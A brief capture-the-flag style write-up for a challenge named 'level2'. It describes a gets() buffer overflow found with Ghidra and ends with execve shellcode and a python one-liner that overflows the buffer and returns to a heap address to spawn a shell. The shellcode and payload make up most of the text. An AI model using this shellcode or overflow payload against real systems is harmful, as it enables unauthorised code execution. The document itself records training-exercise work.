# level2

shell code:
http://shell-storm.org/shellcode/files/shellcode-575.html

"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

We found an exec again. SCP into local to run ghidra.
there is a fn main that calls fn p().

We found a call to gets() again, but this time it is protected by a restriction on our return address, it can't point to any address in the stack so we cannot overflow there. 


We add the 76 bytes with shellcode to char local_50[76] + 4 bytes for the return, then add a valid return address. 

ltrace ./level2 

 (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2